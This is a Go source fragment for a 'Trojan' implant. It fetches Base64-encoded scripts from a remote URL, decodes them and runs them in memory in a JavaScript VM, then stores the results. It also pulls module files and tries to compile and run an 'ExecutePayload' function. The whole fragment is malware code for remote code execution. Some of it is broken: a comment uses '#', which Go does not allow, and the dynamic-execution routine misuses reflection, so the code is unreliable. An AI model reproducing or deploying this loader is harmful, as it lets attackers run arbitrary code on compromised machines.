# Fetches and executes a remote script, then stores the result
func (t *Trojan) executeRemoteScript(url string) {
	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("Failed to fetch script:", err)
		return
	}
	defer resp.Body.Close()

	// Read script content (Base64 encoded)
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Failed to read script:", err)
		return
	}

	// Decode Base64
	script, err := base64.StdEncoding.DecodeString(string(body))
	if err != nil {
		fmt.Println("Failed to decode script:", err)
		return
	}

	// Execute the script in memory using a JavaScript VM
	vm := goja.New()
	value, err := vm.RunString(string(script))
	if err != nil {
		fmt.Println("Execution error:", err)
		return
	}

	// Store result in a file
	t.store_module_result(value.String())

	fmt.Println("Script executed successfully.")
}

func (t *Trojan) module_runner(module string) {
	script, err := get_file_contents("modules", "environment.go", t.client, t.ctx)
	if err != nil {
		fmt.Printf("failed to get config: %v\n", err)
	}

	fmt.Println("[*] Script ---------------------\n", script)
	result, err := compileAndRun(script)
	if err != nil {
		fmt.Println("Error executing script:", err)
		return
	}
	fmt.Println("[*] Result ---------------------\n", result)

}

// Dynamically compile, execute Go code, and capture output
func compileAndRun(sourceCode string) (string, error) {
	// Parse the source code into an AST
	fset := token.NewFileSet()
	node, err := parser.ParseFile(fset, "", sourceCode, parser.AllErrors)
	if err != nil {
		return "", fmt.Errorf("failed to parse source code: %v", err)
	}

	// Type check the AST
	conf := types.Config{Importer: nil}
	info := &types.Info{
		Types: make(map[ast.Expr]types.TypeAndValue),
	}
	_, err = conf.Check("cmd", fset, []*ast.File{node}, info)
	if err != nil {
		return "", fmt.Errorf("type checking failed: %v", err)
	}

	// Use go/packages to load the dynamically compiled package
	pkgs, err := packages.Load(&packages.Config{Mode: packages.LoadSyntax}, "cmd")
	if err != nil {
		return "", fmt.Errorf("failed to load package: %v", err)
	}

	// Use reflection to find and execute the "ExecutePayload" function
	for _, pkg := range pkgs {
		obj := pkg.Types.Scope().Lookup("ExecutePayload")
		if obj == nil {
			return "", fmt.Errorf("ExecutePayload function not found")
		}

		fn := reflect.ValueOf(obj)
		if fn.Kind() != reflect.Func {
			return "", fmt.Errorf("ExecutePayload is not a function")
		}

		// Invoke the function dynamically and capture the result
		results := fn.Call(nil)
		if len(results) > 0 {
			output := results[0].Interface().(string)
			return output, nil
		}
	}

	return "", fmt.Errorf("function executed but returned no output")
}